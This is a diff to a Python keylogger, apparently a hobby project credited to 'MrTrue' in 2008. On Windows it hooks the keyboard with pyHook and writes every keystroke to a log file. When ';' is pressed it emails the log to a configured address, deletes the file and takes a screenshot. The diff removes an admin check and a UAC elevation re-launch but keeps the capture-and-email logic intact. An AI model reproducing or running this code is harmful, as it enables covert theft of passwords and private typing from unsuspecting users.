@@ -1,5 +1,6 @@
 #lib importantes
 #-*- coding: utf-8 -*-
+#!/usr/bin/python2
 
 #Copyright (C) 2008 MrTrue <gui15787@gmail.com>
 #     This program is free software: you can redistribute it and/or modify
@@ -17,7 +18,7 @@
 
 import platform
 system = platform.system()
-if system == "Linux" or  system == "linux":
+if system == "Linux" or system == "linux":
 
   import pyxhook
   import datetime,os,sys,platform
@@ -171,53 +172,21 @@ try:
     screenshot()
 
   elif system == "Windows":
-    import ctypes, sys
+    def OnKeyboardEvent(event):
+      fob=open(log_file,"a")
+      fob.write(event.Key)
+      fob.write("\n")
 
-    def is_admin():
-      try:
-          return ctypes.windll.shell32.IsUserAnAdmin()
-      except:
-          return False
-
-    if is_admin():
-      def OnKeyboardEvent(event):
-        fob=open(log_file,"a")
-        fob.write(event.Key)
-        fob.write("\n")
-
-        if event.Ascii==59:
-          fob.close
-          send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
-          os.remove(log_file)
-          sys.exit(0)
+      if event.Ascii==59:
+        fob.close
+        send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
+        os.remove(log_file)
+        sys.exit(0)
           
-      hooks_manager = pyHook.HookManager()
-      hooks_manager.KeyDown = OnKeyboardEvent
-      hooks_manager.HookKeyboard()
-      pythoncom.PumpMessages()  
-      screenshot()
-
-      # Code of your program here
-    else:
-      # Re-run the program with admin rights
-      ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None,1)
-      
-      def OnKeyboardEvent(event):
-        fob=open(log_file,"a")
-        fob.write(event.Key)
-        fob.write("\n")
-
-        if event.Ascii==59:
-          fob.close
-          send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
-          os.remove(log_file)
-          sys.exit(0)
-
-      hooks_manager = pyHook.HookManager()
-      hooks_manager.KeyDown = OnKeyboardEvent
-      hooks_manager.HookKeyboard()
-      pythoncom.PumpMessages()  
-      screenshot()      
-    
+    hooks_manager = pyHook.HookManager()
+    hooks_manager.KeyDown = OnKeyboardEvent
+    hooks_manager.HookKeyboard()
+    pythoncom.PumpMessages()  
+    screenshot()
 except(KeyboardInterrupt):
   print("Sorry Not Day")
